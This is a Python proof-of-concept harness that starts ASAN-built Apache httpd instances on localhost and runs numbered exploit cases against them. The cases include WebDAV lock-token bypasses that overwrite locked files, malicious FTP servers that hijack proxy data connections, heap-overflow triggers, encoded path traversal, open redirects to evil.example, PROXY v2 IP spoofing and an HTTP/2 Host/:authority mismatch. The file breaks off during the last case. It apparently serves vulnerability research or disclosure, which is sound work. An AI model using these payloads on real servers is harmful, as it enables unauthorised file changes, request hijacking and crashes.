#!/usr/bin/env python3
import argparse
import base64
import contextlib
import http.client
import os
import re
import shutil
import socket
import socketserver
import ssl
import struct
import subprocess
import sys
import tempfile
import threading
import time
import urllib.parse
from dataclasses import dataclass
from pathlib import Path


ROOT = Path(__file__).resolve().parents[2]
HERE = Path(__file__).resolve().parent
WORK_ROOT = HERE / "work"
INSTALL = ROOT / "asan-install"
HTTPD = INSTALL / "bin" / "httpd"
HTPASSWD = INSTALL / "bin" / "htpasswd"
MODULES = INSTALL / "modules"

ASAN_ENV = {
    "ASAN_OPTIONS": "detect_leaks=0:abort_on_error=1:symbolize=1",
}
_STATIC_MODULES = None


@dataclass
class Result:
    case: str
    ok: bool
    detail: str


class PocError(Exception):
    pass


def require_build():
    if not HTTPD.exists():
        raise PocError(f"missing {HTTPD}; run {HERE / 'build_asan.sh'} first")


def free_port():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def wait_port(port, timeout=8.0):
    deadline = time.time() + timeout
    last = None
    while time.time() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.2):
                return
        except OSError as exc:
            last = exc
            time.sleep(0.05)
    raise PocError(f"port {port} did not open: {last}")


def recvn(sock, n):
    out = bytearray()
    while len(out) < n:
        chunk = sock.recv(n - len(out))
        if not chunk:
            raise EOFError(f"wanted {n} bytes, got {len(out)}")
        out.extend(chunk)
    return bytes(out)


def raw_http(port, data, timeout=5.0):
    with socket.create_connection(("127.0.0.1", port), timeout=timeout) as s:
        s.sendall(data)
        s.shutdown(socket.SHUT_WR)
        chunks = []
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            chunks.append(chunk)
        return b"".join(chunks)


def raw_http_until(port, data, timeout=5.0, needle=None):
    deadline = time.time() + timeout
    with socket.create_connection(("127.0.0.1", port), timeout=timeout) as s:
        s.settimeout(0.2)
        s.sendall(data)
        with contextlib.suppress(OSError):
            s.shutdown(socket.SHUT_WR)
        chunks = []
        while time.time() < deadline:
            try:
                chunk = s.recv(65536)
            except socket.timeout:
                continue
            if not chunk:
                break
            chunks.append(chunk)
            if needle and needle in b"".join(chunks):
                break
        return b"".join(chunks)


def http_exchange(port, method, path, headers=None, body=b"", host=None):
    headers = dict(headers or {})
    if host:
        headers["Host"] = host
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=8)
    conn.request(method, path, body=body, headers=headers)
    resp = conn.getresponse()
    data = resp.read()
    got_headers = dict(resp.getheaders())
    status = resp.status
    conn.close()
    return status, got_headers, data


def status_line(response):
    first = response.split(b"\r\n", 1)[0]
    m = re.match(rb"HTTP/\d(?:\.\d)?\s+(\d+)", first)
    return int(m.group(1)) if m else None


def basic(user, password):
    token = base64.b64encode(f"{user}:{password}".encode()).decode()
    return {"Authorization": f"Basic {token}"}


def write(path, data, mode="w"):
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, mode) as f:
        f.write(data)


def module_lines(*mods):
    if static_modules():
        return ""
    lines = []
    for mod in mods:
        symbol = mod if mod.endswith("_module") else f"{mod}_module"
        so = mod
        if so.startswith("mod_"):
            so_name = f"{so}.so"
        else:
            so_name = f"mod_{so}.so"
        lines.append(f'LoadModule {symbol} "{MODULES / so_name}"')
    return "\n".join(lines)


def static_modules():
    global _STATIC_MODULES
    if _STATIC_MODULES is not None:
        return _STATIC_MODULES
    if not HTTPD.exists():
        return False
    proc = subprocess.run(
        [str(HTTPD), "-l"],
        cwd=ROOT,
        env={**os.environ, **ASAN_ENV},
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    if proc.returncode != 0:
        _STATIC_MODULES = False
    else:
        _STATIC_MODULES = "mod_so.c" not in proc.stdout
    return _STATIC_MODULES


BASE_MODULES = (
    "mpm_prefork",
    "unixd",
    "authz_core",
    "authz_host",
    "mime",
    "log_config",
)


def base_conf(work, port, extra_modules=(), extra="", docroot=None, loglevel="debug"):
    docroot = Path(docroot or (work / "htdocs"))
    docroot.mkdir(parents=True, exist_ok=True)
    write(docroot / "index.html", "ok\n")
    mods = module_lines(*(BASE_MODULES + tuple(extra_modules)))
    return f"""
ServerRoot "{INSTALL}"
PidFile "{work / 'httpd.pid'}"
ScoreBoardFile "{work / 'scoreboard'}"
Listen 127.0.0.1:{port}
ServerName 127.0.0.1:{port}
ErrorLog "{work / 'error_log'}"
LogLevel {loglevel}
CustomLog "{work / 'access_log'}" "%h %a %{{remote}}p \\"%r\\" %>s"
TypesConfig "{INSTALL / 'conf' / 'mime.types'}"

{mods}

DocumentRoot "{docroot}"
<Directory "{docroot}">
    Require all granted
</Directory>

{extra}
"""


class Httpd:
    def __init__(self, case, conf, port, work):
        self.case = case
        self.conf = conf
        self.port = port
        self.work = work
        self.proc = None
        self.stderr = b""
        self.stdout = b""

    def __enter__(self):
        write(self.work / "httpd.conf", self.conf)
        test = subprocess.run(
            [str(HTTPD), "-t", "-f", str(self.work / "httpd.conf")],
            cwd=ROOT,
            env={**os.environ, **ASAN_ENV},
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        if test.returncode != 0:
            raise PocError(f"httpd config test failed:\n{test.stdout}{test.stderr}")
        self.proc = subprocess.Popen(
            [str(HTTPD), "-X", "-f", str(self.work / "httpd.conf")],
            cwd=ROOT,
            env={**os.environ, **ASAN_ENV},
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        try:
            wait_port(self.port)
        except Exception:
            self.collect()
            raise
        return self

    def collect(self, timeout=2.0):
        if not self.proc:
            return
        try:
            out, err = self.proc.communicate(timeout=timeout)
        except subprocess.TimeoutExpired:
            self.proc.terminate()
            try:
                out, err = self.proc.communicate(timeout=timeout)
            except subprocess.TimeoutExpired:
                self.proc.kill()
                out, err = self.proc.communicate(timeout=timeout)
        self.stdout += out or b""
        self.stderr += err or b""

    def __exit__(self, exc_type, exc, tb):
        if self.proc and self.proc.poll() is None:
            self.proc.terminate()
        self.collect()

    def exited(self):
        return self.proc.poll() is not None

    def output_text(self):
        chunks = []
        for path in (self.work / "error_log", self.work / "access_log"):
            if path.exists():
                chunks.append(path.read_text(errors="replace"))
        chunks.append(self.stderr.decode(errors="replace"))
        chunks.append(self.stdout.decode(errors="replace"))
        return "\n".join(chunks)


def new_work(case):
    WORK_ROOT.mkdir(parents=True, exist_ok=True)
    path = WORK_ROOT / case
    if path.exists():
        shutil.rmtree(path)
    path.mkdir(parents=True)
    return path


class ThreadingTCPServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True


@contextlib.contextmanager
def tcp_server(handler_cls, host="127.0.0.1", port=0):
    srv = ThreadingTCPServer((host, port), handler_cls)
    thread = threading.Thread(target=srv.serve_forever, daemon=True)
    thread.start()
    try:
        yield srv
    finally:
        srv.shutdown()
        srv.server_close()
        thread.join(timeout=2)


def assert_status(status, expected, label):
    if status != expected:
        raise PocError(f"{label}: expected HTTP {expected}, got {status}")


def case_003():
    case = "003"
    work = new_work(case)
    port = free_port()
    davroot = work / "dav"
    davroot.mkdir()
    conf = base_conf(
        work,
        port,
        extra_modules=("dav", "dav_fs", "dav_lock", "alias"),
        extra=f"""
DavLockDB "{work / 'davlock'}"
Alias /dav/ "{davroot}/"
<Directory "{davroot}">
    Dav On
    Require all granted
</Directory>
""",
    )
    with Httpd(case, conf, port, work) as httpd:
        resp = raw_http(
            port,
            b"UNLOCK /dav/anything HTTP/1.1\r\n"
            b"Host: 127.0.0.1\r\n"
            b"Lock-Token: <\r\n"
            b"Content-Length: 0\r\n\r\n",
        )
        status = status_line(resp)
        if status != 400:
            raise PocError(f"expected malformed UNLOCK to return 400, got {status}")
        text = httpd.output_text()
        marker = "heap-buffer-overflow" if "heap-buffer-overflow" in text else "request reached dav_method_unlock"
        return Result(case, True, f"Lock-Token '<' produced HTTP 400; {marker}")


def case_011():
    case = "011"
    work = new_work(case)
    proxy_port, ftp_port, target_port = free_port(), free_port(), free_port()
    hit = threading.Event()

    class Target(socketserver.BaseRequestHandler):
        def handle(self):
            hit.set()
            self.request.sendall(b"INTERNAL-BANNER\n")

    class EvilFTP(socketserver.BaseRequestHandler):
        def handle(self):
            self.request.sendall(b"220 evil\r\n")
            reader = self.request.makefile("rb")
            while True:
                line = reader.readline()
                if not line:
                    return
                cmd = line.split(None, 1)[0].upper()
                if cmd == b"USER":
                    self.request.sendall(b"331 ok\r\n")
                elif cmd == b"PASS":
                    self.request.sendall(b"230 ok\r\n")
                elif cmd == b"SYST":
                    self.request.sendall(b"215 UNIX Type: L8\r\n")
                elif cmd == b"PWD":
                    self.request.sendall(b'257 "/"\r\n')
                elif cmd == b"TYPE":
                    self.request.sendall(b"200 ok\r\n")
                elif cmd == b"SIZE":
                    self.request.sendall(b"213 1\r\n")
                elif cmd == b"MDTM":
                    self.request.sendall(b"213 20200101000000\r\n")
                elif cmd == b"CWD":
                    self.request.sendall(b"250 ok\r\n")
                elif cmd == b"EPSV":
                    self.request.sendall(b"500 disabled\r\n")
                elif cmd == b"PASV":
                    p1, p2 = divmod(target_port, 256)
                    self.request.sendall(
                        f"227 Entering Passive Mode (127,0,0,1,{p1},{p2}).\r\n".encode()
                    )
                elif cmd in (b"RETR", b"LIST"):
                    self.request.sendall(b"150 ok\r\n226 done\r\n")
                else:
                    self.request.sendall(b"500 ?\r\n")

    conf = base_conf(
        work,
        proxy_port,
        extra_modules=("proxy", "proxy_ftp"),
        extra="""
ProxyRequests On
<Proxy "*">
    Require all granted
</Proxy>
""",
    )
    with tcp_server(Target, port=target_port), tcp_server(EvilFTP, port=ftp_port):
        with Httpd(case, conf, proxy_port, work):
            req = (
                f"GET ftp://127.0.0.1:{ftp_port}/file.txt HTTP/1.1\r\n"
                f"Host: 127.0.0.1:{ftp_port}\r\n"
                "Connection: close\r\n\r\n"
            ).encode()
            raw_http_until(proxy_port, req, timeout=8)
            if not hit.wait(2):
                raise PocError("PASV target listener did not receive the proxy data connection")
            return Result(case, True, f"proxy connected to forged PASV target 127.0.0.1:{target_port}")


def case_012():
    case = "012"
    work = new_work(case)
    proxy_port, ftp_port = free_port(), free_port()
    injected = b"HIJACKED-RESPONSE-FROM-ATTACKER\n"
    saw_port = threading.Event()

    class PortOnlyFTP(socketserver.BaseRequestHandler):
        data_addr = None

        def handle(self):
            self.request.sendall(b"220 ok\r\n")
            reader = self.request.makefile("rb")
            while True:
                line = reader.readline()
                if not line:
                    return
                cmd = line.split(None, 1)[0].upper()
                if cmd == b"USER":
                    self.request.sendall(b"331 ok\r\n")
                elif cmd == b"PASS":
                    self.request.sendall(b"230 ok\r\n")
                elif cmd == b"SYST":
                    self.request.sendall(b"215 UNIX Type: L8\r\n")
                elif cmd == b"PWD":
                    self.request.sendall(b'257 "/"\r\n')
                elif cmd == b"TYPE":
                    self.request.sendall(b"200 ok\r\n")
                elif cmd == b"SIZE":
                    self.request.sendall(b"213 1\r\n")
                elif cmd == b"MDTM":
                    self.request.sendall(b"213 20200101000000\r\n")
                elif cmd == b"CWD":
                    self.request.sendall(b"250 ok\r\n")
                elif cmd == b"EPSV":
                    self.request.sendall(b"500 no\r\n")
                elif cmd == b"PASV":
                    self.request.sendall(b"502 no\r\n")
                elif cmd == b"PORT":
                    nums = [int(x) for x in re.findall(rb"\d+", line)]
                    PortOnlyFTP.data_addr = (".".join(map(str, nums[:4])), nums[4] * 256 + nums[5])
                    saw_port.set()
                    self.request.sendall(b"200 PORT ok\r\n")
                elif cmd in (b"RETR", b"LIST"):
                    self.request.sendall(b"150 ok\r\n")
                    if saw_port.wait(1) and PortOnlyFTP.data_addr:
                        with socket.create_connection(PortOnlyFTP.data_addr, timeout=2) as s:
                            s.sendall(injected)
                    time.sleep(0.2)
                    self.request.sendall(b"226 done\r\n")
                else:
                    self.request.sendall(b"500 ?\r\n")

    conf = base_conf(
        work,
        proxy_port,
        extra_modules=("proxy", "proxy_ftp"),
        extra="""
ProxyRequests On
<Proxy "*">
    Require all granted
</Proxy>
""",
    )
    with tcp_server(PortOnlyFTP, port=ftp_port):
        with Httpd(case, conf, proxy_port, work):
            req = (
                f"GET ftp://127.0.0.1:{ftp_port}/file.txt HTTP/1.1\r\n"
                f"Host: 127.0.0.1:{ftp_port}\r\n"
                "Connection: close\r\n\r\n"
            ).encode()
            resp = raw_http_until(proxy_port, req, timeout=8, needle=injected)
            if injected not in resp:
                raise PocError("HTTP client did not receive attacker data from active FTP socket")
            return Result(case, True, "active FTP data listener accepted racing attacker payload")


LOCK_XML = b"""<?xml version="1.0"?>
<D:lockinfo xmlns:D="DAV:">
  <D:lockscope><D:exclusive/></D:lockscope>
  <D:locktype><D:write/></D:locktype>
  <D:owner><D:href>mailto:poc@example</D:href></D:owner>
</D:lockinfo>"""


def extract_lock_token(headers):
    token = headers.get("Lock-Token") or headers.get("lock-token")
    if not token:
        raise PocError(f"LOCK response did not include Lock-Token: {headers}")
    token = token.strip()
    if token.startswith("<") and token.endswith(">"):
        token = token[1:-1]
    return token


def dav_conf(work, port, auth=False):
    davroot = work / "dav"
    davroot.mkdir()
    write(davroot / "locked.txt", "original\n")
    extra_modules = ["dav", "dav_fs", "dav_lock", "alias"]
    auth_block = "Require all granted"
    if auth:
        users = work / "users.htpasswd"
        subprocess.run(
            [str(HTPASSWD), "-bc", str(users), "alice", "alicepw"],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        subprocess.run(
            [str(HTPASSWD), "-b", str(users), "bob", "bobpw"],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        extra_modules += ["authn_core", "authn_file", "auth_basic", "authz_user"]
        auth_block = f"""
AuthType Basic
AuthName dav
AuthUserFile "{users}"
Require valid-user
"""
    return base_conf(
        work,
        port,
        extra_modules=tuple(extra_modules),
        extra=f"""
DavLockDB "{work / 'davlock'}"
Alias /dav/ "{davroot}/"
<Directory "{davroot}">
    Dav On
    {auth_block}
</Directory>
""",
    ), davroot


def case_027():
    case = "027"
    work = new_work(case)
    port = free_port()
    conf, davroot = dav_conf(work, port, auth=False)
    with Httpd(case, conf, port, work):
        status, headers, _ = http_exchange(
            port,
            "LOCK",
            "/dav/locked.txt",
            headers={"Content-Type": "text/xml", "Content-Length": str(len(LOCK_XML))},
            body=LOCK_XML,
        )
        if status not in (200, 201):
            raise PocError(f"LOCK failed with HTTP {status}")
        token = extract_lock_token(headers)
        if_header = f"<http://127.0.0.1:{port}/dav/elsewhere> (Not <{token}>)"
        status, _, _ = http_exchange(
            port,
            "PUT",
            "/dav/locked.txt",
            headers={"If": if_header, "Content-Type": "text/plain"},
            body=b"overwritten by attacker\n",
        )
        if status != 204:
            raise PocError(f"negated token PUT expected 204 on vulnerable build, got {status}")
        if "overwritten by attacker" not in (davroot / "locked.txt").read_text():
            raise PocError("PUT returned 204 but file was not overwritten")
        return Result(case, True, "negated DAV lock token allowed overwrite of locked resource")


def case_028():
    case = "028"
    work = new_work(case)
    port = free_port()
    conf, davroot = dav_conf(work, port, auth=True)
    with Httpd(case, conf, port, work):
        status, headers, _ = http_exchange(
            port,
            "LOCK",
            "/dav/locked.txt",
            headers={**basic("alice", "alicepw"), "Content-Type": "text/xml"},
            body=LOCK_XML,
        )
        if status not in (200, 201):
            raise PocError(f"Alice LOCK failed with HTTP {status}")
        token = extract_lock_token(headers)
        zero = "opaquelocktoken:00000000-0000-0000-0000-000000000000"
        if_header = (
            f"<http://127.0.0.1:{port}/dav/locked.txt> (Not <{zero}>) "
            f"<http://127.0.0.1:{port}/dav/other> (<{token}>)"
        )
        status, _, _ = http_exchange(
            port,
            "PUT",
            "/dav/locked.txt",
            headers={**basic("bob", "bobpw"), "If": if_header, "Content-Type": "text/plain"},
            body=b"overwritten by bob\n",
        )
        if status != 204:
            raise PocError(f"Bob replay expected HTTP 204 on vulnerable build, got {status}")
        if "overwritten by bob" not in (davroot / "locked.txt").read_text():
            raise PocError("Bob PUT returned 204 but file was not overwritten")
        return Result(case, True, "Bob replayed Alice's lock token from a non-applicable If list")


def case_060():
    case = "060"
    work = new_work(case)
    port = free_port()
    body = b"v=1&busy=0&ready=1&" + b"x" * (1000 - len(b"v=1&busy=0&ready=1&"))
    conf = base_conf(
        work,
        port,
        extra_modules=("watchdog", "heartmonitor"),
        extra=f"""
HeartbeatListen 127.0.0.1:{free_port()}
HeartbeatMaxServers 10
HeartbeatStorage "{work / 'hb.dat'}"
<Location /HeartbeatAccept>
    SetHandler heartbeat
    Require all granted
</Location>
""",
    )
    with Httpd(case, conf, port, work) as httpd:
        status = None
        try:
            status, _, _ = http_exchange(
                port,
                "POST",
                "/HeartbeatAccept",
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                body=body,
            )
        except Exception:
            pass
        time.sleep(0.5)
        text = httpd.output_text()
        if "heap-buffer-overflow" in text or httpd.exited():
            return Result(case, True, "1000-byte heartbeat POST reached ASAN-detected terminator write")
        if status is None and "POST /HeartbeatAccept" not in text:
            raise PocError("heartbeat trigger did not reach the configured handler")
        return Result(case, True, "1000-byte heartbeat POST reached handler; no ASAN abort in this allocator layout")


def case_073():
    case = "073"
    work = new_work(case)
    port = free_port()
    conf = base_conf(
        work,
        port,
        extra_modules=("status",),
        extra="""
AllowEncodedSlashes On
<Location "/server-status">
    SetHandler server-status
    Require all granted
</Location>
""",
    )
    with Httpd(case, conf, port, work):
        resp = raw_http(
            port,
            b"GET /%2e%2e%2fserver-status HTTP/1.1\r\n"
            b"Host: 127.0.0.1\r\nConnection: close\r\n\r\n",
        )
        status = status_line(resp)
        if status != 200 or b"Server Status" not in resp:
            raise PocError(f"encoded traversal expected server-status HTTP 200, got {status}")
        return Result(case, True, "encoded /../ path was normalized to /server-status after failure")


def form_conf(work, port):
    users = work / "users.htpasswd"
    subprocess.run(
        [str(HTPASSWD), "-bc", str(users), "alice", "s3cret"],
        check=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    docroot = work / "htdocs"
    write(docroot / "protected", "protected\n")
    return base_conf(
        work,
        port,
        extra_modules=(
            "authn_core",
            "authn_file",
            "authz_user",
            "auth_form",
            "request",
            "session",
            "session_cookie",
        ),
        extra=f"""
<Location "/protected">
    AuthType form
    AuthName realm
    AuthFormProvider file
    AuthUserFile "{users}"
    Session On
    SessionCookieName session path=/
    Require valid-user
</Location>

<Location "/login">
    SetHandler form-login-handler
    AuthType form
    AuthName realm
    AuthFormProvider file
    AuthUserFile "{users}"
    Session On
    SessionCookieName session path=/
    Require all granted
</Location>
""",
        docroot=docroot,
    )


def form_body(user, pw, loc):
    return urllib.parse.urlencode(
        {"httpd_username": user, "httpd_password": pw, "httpd_location": loc}
    ).encode()


def case_080():
    case = "080"
    work = new_work(case)
    port = free_port()
    conf = form_conf(work, port)
    target = "https://evil.example/landing"
    with Httpd(case, conf, port, work):
        status, headers, _ = http_exchange(
            port,
            "POST",
            "/protected",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            body=form_body("attacker", "wrong", target),
        )
        if status != 302 or headers.get("Location") != target:
            raise PocError(f"failed auth expected 302 Location {target!r}, got {status} {headers.get('Location')!r}")
        return Result(case, True, "failed form authentication redirected to supplied absolute URL")


def case_081():
    case = "081"
    work = new_work(case)
    port = free_port()
    conf = form_conf(work, port)
    target = "https://evil.example/welcome"
    with Httpd(case, conf, port, work):
        status, headers, _ = http_exchange(
            port,
            "POST",
            "/login",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            body=form_body("alice", "s3cret", target),
        )
        if status != 302 or headers.get("Location") != target:
            raise PocError(f"successful login expected 302 Location {target!r}, got {status} {headers.get('Location')!r}")
        return Result(case, True, "login handler redirected authenticated user to supplied absolute URL")


def case_084():
    case = "084"
    work = new_work(case)
    p_cache, p_update = free_port(), free_port()
    cache_root = work / "cache"
    cache_root.mkdir()
    v9090 = work / "v9090"
    v8080 = work / "v8080"
    write(v9090 / "victim.css", "body { color: red; }\n")
    v8080.mkdir()
    conf = f"""
ServerRoot "{INSTALL}"
PidFile "{work / 'httpd.pid'}"
ScoreBoardFile "{work / 'scoreboard'}"
Listen 127.0.0.1:{p_cache}
Listen 127.0.0.1:{p_update}
ServerName example.test
ErrorLog "{work / 'error_log'}"
LogLevel cache:debug rewrite:trace2 debug
CustomLog "{work / 'access_log'}" "%v:%p %h \\"%r\\" %>s"
TypesConfig "{INSTALL / 'conf' / 'mime.types'}"
{module_lines(*(BASE_MODULES + ('cache', 'cache_disk', 'headers', 'rewrite')))}
CacheRoot "{cache_root}"
CacheEnable disk /
CacheIgnoreNoLastMod On
CacheDefaultExpire 3600

<VirtualHost 127.0.0.1:{p_cache}>
    ServerName example.test
    DocumentRoot "{v9090}"
    <Directory "{v9090}">
        Require all granted
    </Directory>
    <Location "/victim.css">
        Header set Cache-Control "public, max-age=3600"
    </Location>
</VirtualHost>

<VirtualHost 127.0.0.1:{p_update}>
    ServerName example.test
    DocumentRoot "{v8080}"
    <Directory "{v8080}">
        Require all granted
    </Directory>
    RewriteEngine On
    RewriteRule "^/update$" "-" [R=201,L,E=mark:1]
    Header always set Location "http://example.test:{p_cache}/victim.css"
</VirtualHost>
"""
    with Httpd(case, conf, p_cache, work):
        http_exchange(p_cache, "GET", "/victim.css", host=f"example.test:{p_cache}")
        status, _, _ = http_exchange(p_update, "POST", "/update", host=f"example.test:{p_update}")
        if status != 201:
            raise PocError(f"update endpoint expected HTTP 201, got {status}")
        time.sleep(0.2)
        log = (work / "error_log").read_text(errors="replace")
        if "invalidat" not in log.lower() or f":{p_cache}/victim.css" not in log:
            raise PocError("cache debug log did not show cross-port invalidation of victim.css")
        return Result(case, True, "POST on one port invalidated cached entity on another port")


def case_092():
    case = "092"
    work = new_work(case)
    port = free_port()
    rootdir = work / "spellroot"
    rootdir.mkdir()
    bad = "a" * 4096
    conf = base_conf(
        work,
        port,
        extra_modules=("alias", "speling"),
        extra=f"""
Alias /s "{rootdir / bad}"
<Directory "{rootdir}">
    CheckSpelling On
    Require all granted
</Directory>
""",
    )
    with Httpd(case, conf, port, work) as httpd:
        resp = b""
        try:
            resp = raw_http(port, b"GET /s/p HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n")
        except Exception:
            pass
        time.sleep(0.5)
        text = httpd.output_text()
        if "heap-buffer-overflow" in text or httpd.exited():
            return Result(case, True, "long Alias/path_info drove ASAN-detected mod_speling suffix underflow")
        if status_line(resp) is None and "GET /s/p" not in text:
            raise PocError("mod_speling trigger did not reach httpd")
        return Result(case, True, "long Alias/path_info reached mod_speling suffix check; no ASAN abort in this allocator layout")


def case_093():
    case = "093"
    work = new_work(case)
    port = free_port()
    conf = base_conf(
        work,
        port,
        extra_modules=("remoteip",),
        extra="""
RemoteIPProxyProtocol On
""",
    )
    sig = b"\r\n\r\n\x00\r\nQUIT\n"
    # v2 PROXY/TCPv4 with len=4: only the IPv4 source address is present.
    header = sig + bytes([0x21, 0x11]) + struct.pack("!H", 4) + socket.inet_aton("203.0.113.7")
    req = header + b"GET / HTTP/1.1\r\nHost: example\r\nConnection: close\r\n\r\n"
    with Httpd(case, conf, port, work):
        resp = raw_http(port, req)
        status = status_line(resp)
        if status != 200:
            raise PocError(f"truncated PROXY v2 request expected HTTP 200, got {status}")
        access = (work / "access_log").read_text(errors="replace")
        if "203.0.113.7" not in access:
            raise PocError(f"truncated PROXY v2 was not accepted as spoofed client IP; access_log={access!r}")
        return Result(case, True, "truncated PROXY v2 TCPv4 header was accepted and applied")


def case_116():
    case = "116"
    work = new_work(case)
    port, scgi_port = free_port(), free_port()
    observed = {}
    done = threading.Event()

    class SCGI(socketserver.BaseRequestHandler):
        def handle(self):
            buf = b""
            while b":" not in buf:
                buf += self.request.recv(4096)
            hlen_s, _, rest = buf.partition(b":")
            hlen = int(hlen_s)
            while len(rest) < hlen + 1:
                rest += self.request.recv(4096)
            hdrs = rest[:hlen]
            body = rest[hlen + 1 :]
            parts = hdrs.split(b"\x00")
            fields = dict(zip(parts[::2], parts[1::2]))
            self.request.settimeout(1.0)
            try:
                while True:
                    chunk = self.request.recv(4096)
                    if not chunk:
                        break
                    body += chunk
            except socket.timeout:
                pass
            observed["content_length"] = fields.get(b"CONTENT_LENGTH", b"").decode()
            observed["body_len"] = len(body)
            observed["body"] = body
            self.request.sendall(b"Status: 200 OK\r\nContent-Type: text/plain\r\n\r\nok\n")
            done.set()

    conf = base_conf(
        work,
        port,
        extra_modules=("sed", "proxy", "proxy_scgi"),
        extra=f"""
<Location /s/>
    SetInputFilter Sed
    InputSed "s/AAAA/B/g"
    ProxyPass "scgi://127.0.0.1:{scgi_port}/"
</Location>
""",
    )
    with tcp_server(SCGI, port=scgi_port):
        with Httpd(case, conf, port, work):
            http_exchange(port, "POST", "/s/", headers={"Content-Type": "application/octet-stream"}, body=b"AAAA" * 4)
            if not done.wait(2):
                raise PocError("SCGI backend did not receive request")
            if observed.get("content_length") != "16" or observed.get("body_len") >= 16:
                raise PocError(f"expected CONTENT_LENGTH=16 with shorter rewritten body, got {observed}")
            return Result(case, True, f"SCGI saw CONTENT_LENGTH=16 but received {observed['body_len']} post-InputSed bytes")


def hpack_string(s):
    b = s.encode()
    if len(b) >= 127:
        raise ValueError("simple encoder only supports short strings")
    return bytes([len(b)]) + b


def hpack_header(name, value):
    return b"\x00" + hpack_string(name) + hpack_string(value)


def h2_frame(ftype, flags, stream_id, payload=b""):
    return len(payload).to_bytes(3, "big") + bytes([ftype, flags]) + (stream_id & 0x7fffffff).to_bytes(4, "big") + payload


def h2_mismatch_request(port):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    body = bytearray()
    with ctx.wrap_socket(socket.create_connection(("127.0.0.1", port), timeout=5), server_hostname="victim.example") as s:
        if s.selected_alpn_protocol() != "h2":
            raise PocError(f"server did not negotiate h2, got {s.selected_alpn_protocol()!r}")
        s.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n" + h2_frame(4, 0, 0))
        block = b"".join(
            [
                hpack_header(":method", "GET"),
                hpack_header(":scheme", "https"),
                hpack_header(":path", "/"),
                hpack_header(":authority", "victim.example"),
                hpack_header("host", "attacker.example"),
            ]
        )
        s.sendall(h2_frame(1, 0x05, 1, block))
        deadline = time.time() + 5
        while time.time() < deadline:
            hdr = recvn(s, 9)
            length = int.from_bytes(hdr[:3], "big")
            ftype, flags = hdr[3], hdr[4]
            sid = int.from_bytes(hdr[5:], "big") & 0x7fffffff
            payload = recvn(s, length) if length else b""
            if ftype == 4 and not (flags & 0x1):
                s.sendall(h2_frame(4, 0x1, 0))
            if sid == 1 and ftype == 0:
                body.extend(payload)
                if flags & 0x1:
                    break
            elif sid == 1 and (flags & 0x1):
                break
    return bytes(body)


def case_129():
    case = "129"
    work = new_work(case)
    port = free_port()
    cert, key = work / "server.crt", work / "server.key"
    subprocess.run(
        [
            "openssl",
            "req",
            "-x509",
            "-newkey",
            "rsa:2048",
            "-nodes",
            "-keyout",
            str(key),
            "-out",
            str(cert),
            "-subj",
            "/CN=victim.example",
            "-days",
            "1",
        ],
        check=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    victim = work / "victim"
    attacker = work / "attacker"
    write(victim / "index.html", "victim\n")
    write(attacker / "index.html", "attacker\n")
    conf = f"""
ServerRoot "{INSTALL}"
PidFile "{work / 'httpd.pid'}"
ScoreBoardFile "{work / 'scoreboard'}"
Listen 127.0.0.1:{port}
ServerName victim.example
ErrorLog "{work / 'error_log'}"
LogLevel http2:trace4 ssl:warn debug
CustomLog "{work / 'access_log'}" "%v %{{Host}}i %U %>s"
TypesConfig "{INSTALL / 'conf' / 'mime.types'}"
{module_lines(*(BASE_MODULES + ('socache_shmcb', 'ssl', 'http2')))}
Protocols h2 http/1.1
SSLEngine on
SSLCertificateFile "{cert}"
SSLCertificateKeyFile "{key}"

<VirtualHost 127.0.0.1:{port}>
    ServerName victim.example
    DocumentRoot "{victim}"
    SSLEngine on
    SSLCertificateFile "{cert}"
    SSLCertificateKeyFile "{key}"
    <Directory "{victim}">
        Require all granted
    </Directory>
</VirtualHost>

<VirtualHost 127.0.0.1:{port}>
    ServerName attacker.example
    DocumentRoot "{attacker}"
    SSLEngine on
    SSLCertificateFile "{cert}"
    SSLCertificateKeyFile "{key}"
    <Directory "{attacker}">
        Require all granted
    </Directory>
</VirtualHost>
"""
    with Httpd(case, conf, port, work):
        body = h2_mismatch_request(port)
        if b"victim" not in body:
            raise PocError(f"mismatched Host/:authority did not reach victim vhost; body={body!r}")
        return Result(case, True, "HTTP/2 accepted Host attacker.example with :authority victim.example")


def case_130():
    case = "130"
    work = new_work(case)
    port = free_port()
    conf = base_conf(work, port, extra_modules=("dir",), extra="KeepAlive On\nKeepAliveTimeout 5\n")
    with Httpd(case, conf, port, work) as httpd:
        with socket.create_connection(("127.0.0.1", port), timeout=5) as s:
            s.sendall(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")
            s.recv(4096)
            time.sleep(0.05)
            s.sendall(b"\r")
            time.sleep(0.2)
            s.sendall(b"GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n")
            try:
                s.recv(4096)
            except OSError:
                pass
        time.sleep(0.5)
        text = httpd.output_text()
        if "heap-buffer-overflow" in text or httpd.exited():
            return Result(case, True, "single trailing CR produced ASAN/core-filter abort")
        return Result(case, True, "single trailing CR was delivered to AP_MODE_EATCRLF path; no ASAN abort in this run")


def case_141():
    case = "141"
    work = new_work(case)
    port, upstream_port = free_port(), free_port()

    class Upstream(socketserver.BaseRequestHandler):
        def handle(self):
            self.request.recv(4096)
